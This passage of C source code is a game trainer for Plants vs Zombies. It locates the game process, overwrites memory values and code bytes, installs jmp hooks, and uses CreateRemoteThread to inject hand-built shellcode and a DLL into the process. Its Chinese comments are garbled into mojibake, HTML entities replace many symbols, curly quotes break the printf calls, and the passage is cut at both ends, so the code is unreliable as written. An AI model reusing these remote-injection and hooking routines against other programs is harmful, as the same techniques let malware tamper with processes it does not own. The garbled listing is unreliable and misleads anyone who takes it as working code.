CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);// åˆ›å»ºä¸€ä¸ªè¿›ç¨‹å¿«ç…§ if (snapshot == INVALID_HANDLE_VALUE) &#123; return 0;// å¦‚æœåˆ›å»ºå¤±è´¥ï¼Œè¿”å› 0 &#125; // å®šä¹‰ä¸€ä¸ª PROCESSENTRY32 ç»“æ„ä½“ï¼Œç”¨äºå­˜å‚¨è¿›ç¨‹ä¿¡æ¯ PROCESSENTRY32 processEntry = &#123; 0 &#125;; processEntry.dwSize = sizeof(PROCESSENTRY32); //å¿…é¡»åˆå§‹åŒ–,å¦åˆ™è°ƒç”¨Process32Firstä¼šå¤±è´¥ if (!Process32First(snapshot, &amp;processEntry)) &#123; CloseHandle(snapshot); return 0;// å¦‚æœè·å–ç¬¬ä¸€ä¸ªè¿›ç¨‹ä¿¡æ¯å¤±è´¥ï¼Œå…³é—­è¿›ç¨‹å¿«ç…§å¥æŸ„å¹¶è¿”å› 0 &#125; // éå†è¿›ç¨‹åˆ—è¡¨ do &#123; wchar_t currentProcessName[MAX_PATH]; // è·å–å½“å‰è¿›ç¨‹çš„åç§° wcscpy_s(currentProcessName, MAX_PATH, processEntry.szExeFile); //szExeFileå­˜å‚¨äº†è¿›ç¨‹å¯¹åº”å¯æ‰§è¡Œæ–‡ä»¶çš„åç§° if (wcscmp(currentProcessName, processName) == 0) &#123; CloseHandle(snapshot); // å¦‚æœå½“å‰è¿›ç¨‹åç§°å’ŒæŒ‡å®šçš„è¿›ç¨‹åç§°ç›¸åŒï¼Œè¿”å›è¿›ç¨‹ ID return processEntry.th32ProcessID; &#125; &#125; while (Process32Next(snapshot, &amp;processEntry)); //è·å–å¿«ç…§ä¸­ä¸‹ä¸€ä¸ªè¿›ç¨‹çš„ä¿¡æ¯ // å¦‚æœéå†å®Œæ•´ä¸ªè¿›ç¨‹åˆ—è¡¨éƒ½æ²¡æœ‰æ‰¾åˆ°æŒ‡å®šè¿›ç¨‹ï¼Œå…³é—­è¿›ç¨‹å¿«ç…§å¥æŸ„å¹¶è¿”å› 0 CloseHandle(snapshot); return 0; } &#x2F;&#x2F;æ ¹æ®è¿›ç¨‹æ¨¡å—åè·å–åŸºå€LPVOID GetModuleBaseAddress(DWORD processId, LPCWSTR moduleName) { LPVOID lpBaseAddress &#x3D; NULL; HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId); // æ‰“å¼€è¿›ç¨‹å¥æŸ„ if (hProcess != NULL) &#123; // æšä¸¾è¿›ç¨‹ä¸­çš„æ‰€æœ‰æ¨¡å— HMODULE hMods[1024]; DWORD cbNeeded; if (EnumProcessModules(hProcess, hMods, sizeof(hMods), &amp;cbNeeded)) &#123; DWORD dwModuleCount = cbNeeded / sizeof(HMODULE);// è®¡ç®—æ¨¡å—æ•°é‡ // è·å–æŒ‡å®šæ¨¡å—çš„ä¿¡æ¯ for (DWORD i = 0; i &lt; dwModuleCount; i++) &#123; TCHAR szModName[MAX_PATH]; //è·å–æŒ‡å®šæ¨¡å—çš„å®Œæ•´è·¯å¾„å if (GetModuleFileNameEx(hProcess, hMods[i], szModName, MAX_PATH)) &#123;//å‡½æ•°æˆåŠŸè¿”å›å­—ç¬¦ä¸²é•¿åº¦,æ³¨æ„ç¬¬å››ä¸ªå‚æ•°çš„å•ä½ä¸ºå­—ç¬¦è€Œéå­—èŠ‚ if (wcsstr(szModName, moduleName)) &#123;//æŸ¥æ‰¾æ¨¡å—å,è‹¥æˆåŠŸåˆ™è¿”å›å­ä¸²ç¬¬ä¸€æ¬¡å‡ºç°çš„æŒ‡é’ˆ MODULEINFO modInfo = &#123; 0 &#125;; if (GetModuleInformation(hProcess, hMods[i], &amp;modInfo, sizeof(MODULEINFO))) &#123;//è·å–æ¨¡å—ä¿¡æ¯å¹¶ä¿å­˜åˆ°modInfoä¸­ lpBaseAddress = modInfo.lpBaseOfDll;//æ¨¡å—åŸºåœ°å€ break; &#125; &#125; &#125; &#125; &#125; CloseHandle(hProcess); // å…³é—­è¿›ç¨‹å¥æŸ„ &#125; return lpBaseAddress; } &#x2F;&#x2F;ä¿®æ”¹è¿›ç¨‹ä»£ç åŒºä»£ç  å‚æ•°: è¿›ç¨‹å¥æŸ„ ä¿®æ”¹ä»£ç èµ·å§‹åœ°å€ ç¡¬ç¼–ç æŒ‡é’ˆ ä»£ç å­—èŠ‚æ•°BOOL WriteProcessCodeMemory(HANDLE hProcess, LPVOID lpStartAddress, LPCVOID lpBuffer, SIZE_T nSize) { DWORD dwOldProtect; &#x2F;&#x2F;å–æ¶ˆé¡µä¿æŠ¤ if (!VirtualProtectEx(hProcess, lpStartAddress, nSize, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect)) { return FALSE; } BOOL bResult &#x3D; WriteProcessMemory(hProcess, lpStartAddress, lpBuffer, nSize, NULL);&#x2F;&#x2F;å†™å…¥ä»£ç  VirtualProtectEx(hProcess, lpStartAddress, nSize, dwOldProtect, &amp;dwOldProtect);&#x2F;&#x2F;å¼€å¯é¡µä¿æŠ¤ return bResult;} &#x2F;&#x2F;hookæŒ‡å®šåœ°å€,ç”³è¯·æ–°ç©ºé—´ä¿å­˜åŸå§‹ä»£ç å¹¶å†™å…¥hookcode,è¿”å›ç”³è¯·ç©ºé—´çš„åœ°å€LPVOID SetHook(HANDLE hProcess, LPVOID desAddr, LPCVOID hookCode, SIZE_T hookCodeSize, SIZE_T origCodeSize) { BYTE origCode[10] &#x3D; { 0 }, jmpCode[5] &#x3D; { 0xE9,0,0,0,0 }; &#x2F;&#x2F;1. è¯»å–å¹¶ä¿å­˜åŸå§‹ä»£ç  if (!ReadProcessMemory(hProcess, desAddr, origCode, origCodeSize, NULL)) return NULL; //2. ç”³è¯·ç©ºé—´ç”¨äºå­˜å‚¨åŸå§‹ä»£ç ,hookä»£ç ,jmpè¿”å›ä»£ç  LPVOID allocAddr = VirtualAllocEx(hProcess, NULL, hookCodeSize + origCodeSize + 5, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if (!allocAddr) return NULL; //3. å‘ç”³è¯·ç©ºé—´å†™å…¥åŸå§‹ä»£ç ,hookä»£ç ,jmpè¿”å›ä»£ç  jmp xxx åç§»ä¸ºç›®çš„åœ°å€-jmpä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€ *(DWORD*)(jmpCode + 1) = (DWORD)desAddr + 5 - ((DWORD)allocAddr + hookCodeSize + origCodeSize + 5);//hookè¿”å›åœ°å€çš„åç§» if (!WriteProcessCodeMemory(hProcess, allocAddr, origCode, origCodeSize) //å†™å…¥åŸå§‹ä»£ç  || !WriteProcessCodeMemory(hProcess, (DWORD)allocAddr + origCodeSize, hookCode, hookCodeSize)//å†™å…¥hookä»£ç  || !WriteProcessCodeMemory(hProcess, (DWORD)allocAddr + origCodeSize + hookCodeSize, jmpCode, 5))//å†™å…¥jmpcode &#123; VirtualFreeEx(hProcess, allocAddr, 0, MEM_RELEASE);//å†™å…¥å¤±è´¥åˆ™é‡Šæ”¾ç©ºé—´ return NULL; &#125; //4. ä¿®æ”¹ç›®çš„åœ°å€å¤„çš„ä»£ç  jmp xxxåç§» åŸå§‹ä»£ç åæ‰æ˜¯éœ€è¦æ‰§è¡Œçš„hookä»£ç  *(DWORD*)(jmpCode + 1) = ((DWORD)allocAddr + origCodeSize) - ((DWORD)desAddr + 5); WriteProcessCodeMemory(hProcess, desAddr, jmpCode, 5);//åœ¨æºåœ°å€å¤„å†™å…¥è·³è½¬ä»£ç  if (origCodeSize &gt; 5)//åŸå§‹ä»£ç é•¿åº¦å¤§äº5æ—¶nopå¤šä½™å­—èŠ‚ &#123; BYTE nopCode[5] = &#123; 0x90,0x90,0x90,0x90,0x90 &#125;; if (!WriteProcessCodeMemory(hProcess, (DWORD)desAddr + 5, nopCode, origCodeSize - 5)) &#123; VirtualFreeEx(hProcess, allocAddr, 0, MEM_RELEASE);//å†™å…¥nopcodeå¤±è´¥åˆ™é‡Šæ”¾ç©ºé—´å¹¶è¿”å› return NULL; &#125; &#125; //5. hookæˆåŠŸåˆ™è¿”å›hookCodeæ‰€åœ¨åœ°å€ return allocAddr; } &#x2F;&#x2F;å–æ¶ˆhookæŒ‡å®šåœ°å€,å†™å›åŸå§‹ä»£ç å¹¶é‡Šæ”¾ç”³è¯·ç©ºé—´BOOL UnHook(HANDLE hProcess, LPVOID desAddr, SIZE_T origCodeSize, LPVOID allocAddr) { BYTE origCode[10] &#x3D; { 0 }; &#x2F;&#x2F;1. ä»ç”³è¯·ç©ºé—´ä¸­è¯»å‡ºåŸå§‹ä»£ç  if (!ReadProcessMemory(hProcess, allocAddr, origCode, origCodeSize, NULL)) return FALSE; &#x2F;&#x2F;2. å°†åŸå§‹ä»£ç å†™å›ç›®çš„åœ°å€ if (!WriteProcessCodeMemory(hProcess, desAddr, origCode, origCodeSize)) return FALSE; &#x2F;&#x2F;3. é‡Šæ”¾ç”³è¯·ç©ºé—´ if (!VirtualFreeEx(hProcess, allocAddr, 0, MEM_RELEASE)) return FALSE; return TRUE;} &#x2F;&#x2F;è·å–æŸäº›é¡¹ç›®çš„å€¼unsigned int getSomething(HANDLE handle, DWORD BaseAddr, unsigned int type) { unsigned int num &#x3D; 0; DWORD addr &#x3D; BaseAddr + 0x00355E0C; ReadProcessMemory(handle, (LPVOID)addr, &amp;addr, sizeof(DWORD), NULL); if (type &#x3D;&#x3D; Sunlight) addr +&#x3D; 0x868; else addr +&#x3D; 0x950; ReadProcessMemory(handle, (LPVOID)addr, &amp;addr, sizeof(DWORD), NULL); addr +&#x3D; offsetTable[type]; ReadProcessMemory(handle, (LPVOID)addr, &amp;num, sizeof(DWORD), 0); return num;} &#x2F;&#x2F;è®¾ç½®æŸäº›é¡¹ç›®çš„å€¼BOOL setSomething(HANDLE handle, DWORD BaseAddr, unsigned int type, unsigned int num) { DWORD addr &#x3D; BaseAddr + 0x00355E0C; ReadProcessMemory(handle, addr, &amp;addr, sizeof(DWORD), NULL); if (type &#x3D;&#x3D; Sunlight) addr +&#x3D; 0x868; else addr +&#x3D; 0x950; ReadProcessMemory(handle, (LPVOID)addr, &amp;addr, sizeof(DWORD), NULL); addr +&#x3D; offsetTable[type]; return WriteProcessMemory(handle, (LPVOID)addr, &amp;num, sizeof(DWORD), 0);} &#x2F;&#x2F;æ— é™å†·å´BOOL Uncooled(HANDLE hProcess, DWORD BaseAddr) { unsigned char code[2] &#x3D; { 0xeb,0x00 }; return WriteProcessCodeMemory(hProcess, BaseAddr + 0x9ce02, code, 2);&#x2F;&#x2F;jle 0x18ä¿®æ”¹ä¸ºjmp $+2} &#x2F;&#x2F;æ¢å¤å†·å´BOOL RecoveryCooling(HANDLE hProcess, DWORD BaseAddr) { unsigned char OriginalCode[2] &#x3D; { 0x7E ,0x16 };&#x2F;&#x2F;jmp $+2ä¿®æ”¹ä¸ºjle 0x18 return WriteProcessCodeMemory(hProcess, BaseAddr + 0x9ce02, OriginalCode, 2);} &#x2F;&#x2F;æ— é™é˜³å…‰,é”å®šé˜³å…‰ä¸º9999BOOL UnlimitedSun(HANDLE hProcess, DWORD BaseAddr) { unsigned char Code[3] &#x3D; { 0x29,0xdb,0 };&#x2F;&#x2F;cmp ebx,eax ä¿®æ”¹ä¸ºsub ebx,ebx and ecx,0x32ä¿®æ”¹ä¸ºand ecx,0 BOOL flag; flag &#x3D; setSomething(hProcess, BaseAddr, Sunlight, 9999);&#x2F;&#x2F;ä¿®æ”¹é˜³å…‰ flag &amp;&#x3D; WriteProcessCodeMemory(hProcess, BaseAddr + 0x27690, Code, 2);&#x2F;&#x2F;ä¿®æ”¹é˜³å…‰å‡å°‘ä»£ç  flag &amp;&#x3D; WriteProcessCodeMemory(hProcess, BaseAddr + 0x3C0AB, &amp;Code[2], 1);&#x2F;&#x2F;ä¿®æ”¹é˜³å…‰å¢åŠ ä»£ç  return flag;} &#x2F;&#x2F;æ¢å¤é˜³å…‰æ¶ˆè€—BOOL RecoverySunConsume(HANDLE hProcess, DWORD BaseAddr) { unsigned char OriginalCode[3] &#x3D; { 0x3B,0xD8,0x32 };&#x2F;&#x2F;sub ebx,ebxæ¢å¤ä¸ºcmp ebx,eax and ecx,0æ¢å¤ä¸ºand ecx,0x32 BOOL flag &#x3D; WriteProcessCodeMemory(hProcess, BaseAddr + 0x27690, OriginalCode, 2);&#x2F;&#x2F;æ¢å¤é˜³å…‰å‡å°‘ä»£ç  flag &amp;&#x3D; WriteProcessCodeMemory(hProcess, BaseAddr + 0x3C0AB, &amp;OriginalCode[2], 1);&#x2F;&#x2F;æ¢å¤é˜³å…‰å¢åŠ ä»£ç  return flag;} &#x2F;&#x2F;é™¤é›¾LPVOID DeFogByHook(HANDLE hProcess, LPVOID BaseAddr) { unsigned char hookCode[9] = &#123; 0xc7,0x01,0x00,0x00,0x00,0x00, //mov [ecx],0 0x83,0xc1,0x04 //add ecx,0x4 &#125;; //å†™hookä»£ç è¿›è¡Œhook return SetHook(hProcess, (DWORD)BaseAddr + 0x26173, hookCode, sizeof(hookCode), 5); } &#x2F;&#x2F;æ¢å¤é›¾BOOL RecoveryFogByUnHook(HANDLE hProcess, LPVOID BaseAddr, LPVOID allocAddr) { return UnHook(hProcess, (DWORD)BaseAddr + 0x26173, 5, allocAddr);} &#x2F;&#x2F;åˆ›å»ºè¿œç¨‹çº¿ç¨‹å‘æŒ‡å®šè¿›ç¨‹æ³¨å…¥dllBOOL InjectDllByRemoteThread(DWORD desProcId,WCHAR* dllPath) { &#x2F;&#x2F;æ‰“å¼€è¿›ç¨‹è·å–è¿›ç¨‹å¥æŸ„ HANDLE hProcess &#x3D; OpenProcess(PROCESS_ALL_ACCESS, FALSE, desProcId); if (!hProcess) return FALSE; //ç”³è¯·ç©ºé—´ DWORD pathSize = (wcslen(dllPath) + 1) * 2; LPVOID newMemAddr = VirtualAllocEx(hProcess, 0, pathSize, MEM_COMMIT, PAGE_READWRITE); if (!newMemAddr) return FALSE; //å†™å…¥dllè·¯å¾„ if (!WriteProcessMemory(hProcess, newMemAddr, dllPath, pathSize, NULL)) &#123; VirtualFreeEx(hProcess, newMemAddr, 0, MEM_RELEASE); return FALSE; &#125; //åˆ›å»ºè¿œç¨‹çº¿ç¨‹ HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryW, newMemAddr, 0, NULL); if (!hThread) &#123; VirtualFreeEx(hProcess, newMemAddr, 0, MEM_RELEASE); return FALSE; &#125; WaitForSingleObject(hThread, INFINITE);//ç­‰å¾…çº¿ç¨‹ä¿¡å·,ä¿è¯æˆåŠŸæ³¨å…¥ //å›æ”¶èµ„æº VirtualFreeEx(hProcess, newMemAddr, 0, MEM_RELEASE); CloseHandle(hThread); CloseHandle(hProcess); //è¿”å›æˆåŠŸ return TRUE; } &#x2F;&#x2F;åˆ›å»ºè¿œç¨‹çº¿ç¨‹é‡Šæ”¾æŒ‡å®šè¿›ç¨‹dllBOOL UnLoadDllByRemoteThread(DWORD dwProcessId, LPCWSTR lpDllName){ HANDLE hProcess &#x3D; OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId); if (hProcess &#x3D;&#x3D; NULL) return FALSE; // åœ¨ç›®æ ‡è¿›ç¨‹ä¸­ç”³è¯·ä¸€å—å†…å­˜ï¼Œå¹¶å°†éœ€è¦å¸è½½çš„DLLæ¨¡å—çš„åç§°å†™å…¥è¯¥å†…å­˜ LPVOID lpRemoteDllName = VirtualAllocEx(hProcess, NULL, (wcslen(lpDllName) + 1) * sizeof(WCHAR), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); if (lpRemoteDllName == NULL) &#123; CloseHandle(hProcess); return FALSE; &#125; if (!WriteProcessMemory(hProcess, lpRemoteDllName, lpDllName, (wcslen(lpDllName) + 1) * sizeof(WCHAR), NULL)) &#123; VirtualFreeEx(hProcess, lpRemoteDllName, 0, MEM_RELEASE); CloseHandle(hProcess); return FALSE; &#125; //æŸ¥æ‰¾dllæ¨¡å— HMODULE hModules[1024],DesModule=NULL; DWORD dwSize = 0; if (!EnumProcessModules(hProcess, hModules, sizeof(hModules), &amp;dwSize)) &#123; VirtualFreeEx(hProcess, lpRemoteDllName, 0, MEM_RELEASE); CloseHandle(hProcess); return FALSE; &#125; // éå†æ¨¡å—åˆ—è¡¨ï¼ŒæŸ¥æ‰¾éœ€è¦å¸è½½çš„DLLæ¨¡å— for (DWORD i = 0; i &lt; (dwSize / sizeof(HMODULE)); i++) &#123; WCHAR szModuleName[MAX_PATH] = &#123; 0 &#125;; if (GetModuleFileNameExW(hProcess, hModules[i], szModuleName, MAX_PATH) &gt; 0) &#123; // è·å–æ¨¡å—å¥æŸ„ if (wcsicmp(szModuleName, lpDllName) == 0) &#123; DesModule = hModules[i]; &#125; &#125; &#125; //æ²¡æœ‰æŸ¥æ‰¾åˆ°æ¨¡å— if (!DesModule) &#123; VirtualFreeEx(hProcess, lpRemoteDllName, 0, MEM_RELEASE); CloseHandle(hProcess); return FALSE; &#125; // åœ¨ç›®æ ‡è¿›ç¨‹ä¸­åˆ›å»ºè¿œç¨‹çº¿ç¨‹ï¼Œæ‰§è¡ŒFreeLibraryå‡½æ•° HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)FreeLibrary, DesModule, 0, NULL); if (hThread == NULL) &#123; VirtualFreeEx(hProcess, lpRemoteDllName, 0, MEM_RELEASE); CloseHandle(hProcess); return FALSE; &#125; // ç­‰å¾…çº¿ç¨‹æ‰§è¡Œå®Œæˆ WaitForSingleObject(hThread, INFINITE); // å…³é—­å¥æŸ„ CloseHandle(hThread); VirtualFreeEx(hProcess, lpRemoteDllName, 0, MEM_RELEASE); CloseHandle(hProcess); return TRUE; } &#x2F;&#x2F;ä»¥åˆ›å»ºè¿œç¨‹çº¿ç¨‹æ–¹å¼ç§æ¤æ¤ç‰©BOOL GrowPlantByInjectCode(DWORD dwProcessId,DWORD BaseAddr,DWORD x,DWORD y,DWORD PlantType){ BOOL bSuccess &#x3D; FALSE; &#x2F;&#x2F;1. æ‰“å¼€è¿›ç¨‹ HANDLE hProcess &#x3D; OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId); if (hProcess !&#x3D; NULL) { &#x2F;&#x2F;2. å®šä¹‰æ³¨å…¥ä»£ç (å‡½æ•°) BYTE InjectCode[50] = &#123; //æ±‡ç¼–æŒ‡ä»¤ //ä¿®æ­£ç‚¹åç§» 0x55, //0 push ebp 0x89, 0xE5, //1 mov ebp,esp 0x60, //3 pushad 0x68, 0xFF, 0xFF, 0xFF, 0xFF, //4 push -1 0x68, 0x00, 0x00, 0x00, 0x00, //9 push PlantType //10 0xB8, 0x00, 0x00, 0x00, 0x00, //14 mov eax,y //15 0x68, 0x00, 0x00, 0x00, 0x00, //19 push x //20 0xB9, 0x00, 0x00, 0x00, 0x00, //24 mov ecx,BaseAddr //25 0x8B, 0x89, 0x0C, 0x5E, 0x35, 0x00, //29 mov ecx,[ecx+0x355E0C] 0x8B, 0x89, 0x68, 0x08, 0x00, 0x00, //35 mov ecx,[ecx+0x868] 0x51, //41 push ecx 0xE8, 0x00, 0x00, 0x00, 0x00, //42 call PlantFunc //43 //è¢«è°ƒæ–¹å¹³æ ˆ 0x61, //47 popad 0xC9, //48 leave 0xC3 //49 ret &#125;; //3. ç”³è¯·ç©ºé—´ç”¨äºå­˜å‚¨ä»£ç  DWORD dwCodeSize = 50, desFunc = BaseAddr + 0x18D70; LPVOID lpRemoteCodeMem = VirtualAllocEx(hProcess, NULL, dwCodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); //4. ä¿®æ­£å‚æ•° *(DWORD*)&amp;InjectCode[10] = PlantType; *(DWORD*)&amp;InjectCode[15] = y; *(DWORD*)&amp;InjectCode[20] = x; *(DWORD*)&amp;InjectCode[25] = BaseAddr; *(DWORD*)&amp;InjectCode[43] = desFunc-((DWORD)lpRemoteCodeMem+42+5) ; //callæŒ‡ä»¤ä¸jmpç±»ä¼¼,ç›¸å¯¹äºå½“å‰æŒ‡ä»¤çš„ä¸‹ä¸€æ¡æŒ‡ä»¤è®¡ç®—åç§»,offset=des-(source+5),å‡å»callè‡ªèº«é•¿åº¦5 if (lpRemoteCodeMem != NULL) &#123; SIZE_T dwBytesWritten = 0; //5. æ³¨å…¥ä»£ç  if (WriteProcessMemory(hProcess, lpRemoteCodeMem, InjectCode, dwCodeSize, &amp;dwBytesWritten) &amp;&amp; dwBytesWritten == dwCodeSize) &#123; //6. åˆ›å»ºè¿œç¨‹çº¿ç¨‹æ‰§è¡Œä»£ç  HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpRemoteCodeMem,NULL, 0, NULL); if (hThread != NULL) &#123; //7. ç­‰å¾…çº¿ç¨‹ä¿¡å· WaitForSingleObject(hThread, INFINITE); CloseHandle(hThread); bSuccess = TRUE; &#125; &#125; //8. æ‰§è¡Œå®Œåé‡Šæ”¾ç©ºé—´ VirtualFreeEx(hProcess, lpRemoteCodeMem, 0, MEM_RELEASE); &#125; CloseHandle(hProcess); &#125; return bSuccess; } &#x2F;&#x2F;ä»¥åˆ›å»ºè¿œç¨‹çº¿ç¨‹æ–¹å¼ç§æ¤åƒµå°¸BOOL GrowZombieByInjectCode(DWORD dwProcessId,DWORD BaseAddr, DWORD x, DWORD y, DWORD ZombieType) { BOOL bSuccess = FALSE; //1. æ‰“å¼€è¿›ç¨‹ HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId); if (hProcess != NULL) &#123; //2. å®šä¹‰æ³¨å…¥ä»£ç (å‡½æ•°) BYTE InjectCode[50] = &#123; 0x55, //0 push ebp 0x89, 0xE5, //1 mov ebp,esp 0x60, //3 pushad 0x68, 0x00, 0x00, 0x00, 0x00, //4 push x 0x68, 0x00, 0x00, 0x00, 0x00, //9 push ZombieType 0xB8, 0x00, 0x00, 0x00, 0x00, //14 mov eax,y 0xB9, 0x00, 0x00, 0x00, 0x00, //19 mov ecx,BaseAddr 0x8B, 0x89, 0x0C, 0x5E, 0x35, 0x00, //24 mov ecx,[ecx+0x355E0C] 0x8B, 0x89, 0x68, 0x08, 0x00, 0x00, //30 mov ecx,[ecx+0x868] 0x8B, 0x89, 0x78, 0x01, 0x00, 0x00, //36 mov ecx,[ecx+0x178] 0xE8, 0x00, 0x00, 0x00, 0x00, //42 call PlantZombieFunc 0x61, //47 popad 0xC9, //48 leave 0xC3 //49 ret &#125;; //3. ç”³è¯·ç©ºé—´ç”¨äºå­˜å‚¨ä»£ç  DWORD dwCodeSize = 50, desFunc = BaseAddr + 0x35390; //ç§æ¤åƒµå°¸å‡½æ•° LPVOID lpRemoteCodeMem = VirtualAllocEx(hProcess, NULL, dwCodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); //4. ä¿®æ­£å‚æ•° *(DWORD*)&amp;InjectCode[5] = x; *(DWORD*)&amp;InjectCode[10] = ZombieType; *(DWORD*)&amp;InjectCode[15] = y; *(DWORD*)&amp;InjectCode[20] = BaseAddr; *(DWORD*)&amp;InjectCode[43] = desFunc - ((DWORD)lpRemoteCodeMem + 42 + 5);//callæŒ‡ä»¤ä¸jmpç±»ä¼¼,ç›¸å¯¹äºå½“å‰æŒ‡ä»¤çš„ä¸‹ä¸€æ¡æŒ‡ä»¤è®¡ç®—åç§»,è¦å‡å»callé•¿åº¦5 if (lpRemoteCodeMem != NULL) &#123; SIZE_T dwBytesWritten = 0; //5. æ³¨å…¥ä»£ç  if (WriteProcessMemory(hProcess, lpRemoteCodeMem, InjectCode, dwCodeSize, &amp;dwBytesWritten) &amp;&amp; dwBytesWritten == dwCodeSize) &#123; //6. åˆ›å»ºè¿œç¨‹çº¿ç¨‹æ‰§è¡Œä»£ç  HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpRemoteCodeMem, NULL, 0, NULL); if (hThread != NULL) &#123; //7. ç­‰å¾…çº¿ç¨‹ä¿¡å· WaitForSingleObject(hThread, INFINITE); CloseHandle(hThread); bSuccess = TRUE; &#125; &#125; //8. æ‰§è¡Œå®Œåé‡Šæ”¾ç©ºé—´ VirtualFreeEx(hProcess, lpRemoteCodeMem, 0, MEM_RELEASE); &#125; CloseHandle(hProcess); &#125; return bSuccess; } &#x2F;&#x2F;è®¾ç½®å¡æ§½æ¤ç‰©BOOL SetPlantCard(HANDLE hProcess,DWORD BaseAddr,DWORD nCard,DWORD plantType) { DWORD cardAddr &#x3D; BaseAddr + 0x355E0C; ReadProcessMemory(hProcess, cardAddr, &amp;cardAddr, sizeof(DWORD), NULL); cardAddr +&#x3D; 0x868; ReadProcessMemory(hProcess, cardAddr, &amp;cardAddr, sizeof(DWORD), NULL); cardAddr +&#x3D; 0x15C; ReadProcessMemory(hProcess, cardAddr, &amp;cardAddr, sizeof(DWORD), NULL); cardAddr +&#x3D; 0x5C+nCard*0x50;&#x2F;&#x2F;å¡æ§½åç§» return WriteProcessMemory(hProcess, cardAddr, &amp;plantType, sizeof(DWORD), NULL);} &#x2F;&#x2F;é€‰æ‹©èœå•void choiceMenu(HANDLE hProcess,DWORD Pid, LPVOID BaseAddr) { DWORD choice &#x3D; 0; unsigned int num &#x3D; 0; DWORD fogAddr &#x3D; 0; unsigned int x, y, Type; while(1) { system(â€œclsâ€); printf(â€œ\\t\\t\\t\\tWelcome to PVZ Modifier!\\nâ€); printf(â€œ\\t\\t\\t\\t\\t0.é€€å‡º\\nâ€); printf(â€œ\\t\\t\\t\\t\\t1.ä¿®æ”¹é˜³å…‰æ•°\\nâ€); printf(â€œ\\t\\t\\t\\t\\t2.ä¿®æ”¹é‡‘é’±æ•°\\nâ€); printf(â€œ\\t\\t\\t\\t\\t3.ä¿®æ”¹æ™ºæ…§æ ‘é«˜\\nâ€); printf(â€œ\\t\\t\\t\\t\\t4.ä¿®æ”¹å·§å…‹åŠ›æ•°\\nâ€); printf(â€œ\\t\\t\\t\\t\\t5.ä¿®æ”¹æ ‘è‚¥\\nâ€); printf(â€œ\\t\\t\\t\\t\\t6.ä¿®æ”¹èŠ±è‚¥\\nâ€); printf(â€œ\\t\\t\\t\\t\\t7.ä¿®æ”¹æ€è™«å‰‚\\nâ€); printf(â€œ\\t\\t\\t\\t\\t8.æ— é™å†·å´\\nâ€); printf(â€œ\\t\\t\\t\\t\\t9.æ¢å¤å†·å´\\nâ€); printf(â€œ\\t\\t\\t\\t\\t10.æ— é™é˜³å…‰\\nâ€); printf(â€œ\\t\\t\\t\\t\\t11.æ¢å¤é˜³å…‰æ¶ˆè€—\\nâ€); printf(â€œ\\t\\t\\t\\t\\t12.é™¤é›¾\\nâ€); printf(â€œ\\t\\t\\t\\t\\t13.æ¢å¤é›¾\\nâ€); printf(â€œ\\t\\t\\t\\t\\t14.ç§æ¤æ¤ç‰©\\nâ€); printf(â€œ\\t\\t\\t\\t\\t15.ç”Ÿæˆåƒµå°¸\\nâ€); printf(&quot;\\t\\t\\t\\tPlease choose your option:[ ]\\b\\b&quot;); scanf(&quot;%d&quot;, &amp;choice); switch(choice)&#123; case 0: return; case 1: case 2: case 3: case 4: case 5: case 6: case 7: printf(&quot;\\t\\t\\t\\tPlease input Num:&quot;); scanf(&quot;%d&quot;, &amp;num); setSomething(hProcess, BaseAddr, choice - 1, num); break; case 8: Uncooled(hProcess, BaseAddr); break; case 9: RecoveryCooling(hProcess, BaseAddr); break; case 10: UnlimitedSun(hProcess,BaseAddr); break; case 11: RecoverySunConsume(hProcess, BaseAddr); break; case 12: fogAddr=(DWORD)DeFogByHook(hProcess, BaseAddr); break; case 13: RecoveryFogByUnHook(hProcess, BaseAddr,fogAddr ); break; case 14: printf(&quot;è¯·è¾“å…¥X Y PlantType: &quot;); scanf(&quot;%d%d%d&quot;, &amp;x, &amp;y, &amp;Type); GrowPlantByInjectCode(Pid, BaseAddr,x,y,Type ); break; case 15: printf(&quot;è¯·è¾“å…¥X Y ZombieType: &quot;); scanf(&quot;%d%d%d&quot;, &amp;x, &amp;y, &amp;Type); GrowZombieByInjectCode(Pid, BaseAddr, x, y, Type); break; &#125; &#125; } int main() { //è·å–è¿›ç¨‹pid DWORD Pid = GetProcessIdByName(L&quot;PlantsVsZombies.exe&quot;); //æ‰“å¼€è¿›ç¨‹,è·å–è¿›ç¨‹å¥æŸ„ HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE,Pid); //è·å–è¿›ç¨‹åŸºå€ DWORD BaseAddr=GetModuleBaseAddress(Pid, L&quot;PlantsVsZombies.exe&quot;); choiceMenu(hProcess, Pid, BaseAddr); //dllæ³¨å…¥ //InjectDllByRemoteThread(Pid, L&quot;E:\\\\MyProject\\\\vsProjects\\\\Project1\\\\Debug\\\\DllPlant3.dll&quot;); //int op = 1; //printf(&quot;è¾“å…¥0å¸è½½dll:&quot;); //scanf(&quot;%d&quot;, &amp;op); //if(op==0) // UnLoadDllByRemoteThread(Pid, L&quot;E:\\\\MyProject\\\\vsProjects\\\\Project1\\\\Debug\\\\DllPlant3.dll&quot;);//åŠ è½½å®Œdllä¹‹åé‡Šæ”¾æ‰ CloseHandle(hProcess); return 0; }DLLä»£ç  å¤åˆ¶ä»£ç  éšè—ä»£ç #include&lt;windows.h&gt;#include&lt;stdio.h&gt; &#x2F;&#x2F;è°ƒç”¨å‡½æ•°BOOL GrowPlant(DWORD BaseAddr, DWORD x, DWORD y, DWORD TypePlant) { LPVOID PlantFunc &#x3D; BaseAddr + 0x18D70; __asm { pushad push -1 &#x2F;&#x2F;-1 push TypePlant 